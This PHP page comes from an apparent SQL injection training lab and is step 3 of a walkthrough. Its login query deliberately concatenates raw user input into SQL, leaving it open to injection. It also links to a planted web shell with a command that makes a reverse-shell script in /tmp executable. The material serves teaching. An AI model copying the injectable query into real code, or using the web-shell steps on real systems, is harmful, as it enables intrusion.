<?php

    require 'functions.php';
    require 'config.php';

    $username = $_POST['username'] ?? null;
    $password = $_POST['password'] ?? null;

    $sql = "SELECT * FROM user WHERE username='$username' AND password=MD5('$password')";

    if ($username) {
        $stmt = $db->prepare($sql);
        $stmt->execute();

        // Rather than process login, we're just going to dump output for this example.
        $result = $stmt->fetch();
    
        if ($result) {
            echo "Welcome, ". $result['first_name'] ." ". $result['last_name'] .".";
            exit;
        } else {
            $flash = 'Incorrect username or password';
        }
    }

?>

<html lang="en">
    <head>
        <title>SQL Injection Example</title>
        <link rel="stylesheet" href="css/style.css" />
        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    </head>
    <body>
		<div class="container">
             <div class="steps">
                 <h2>Step 3</h2>
 	        	<h4>Change the permissions on the reverse shell to make it executable</h4>
 	        	<p>
 	        	    <a href="http://<?= HOST ?>/images/system.php?cmd=chmod%20777%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=chmod 777  /tmp/reverse-shell.py</a>
 	        	</p>
             </div>
        <nav>
            <a href="login4.php">Goto step 4</a>
        </nav>
        </div>

        <script>
            window.onload = function() {
              $('em.input').click(function() {
                str = $(this).html();
                $('#password-input').val(str);
              });
            }
        </script>

    </body>
</html>
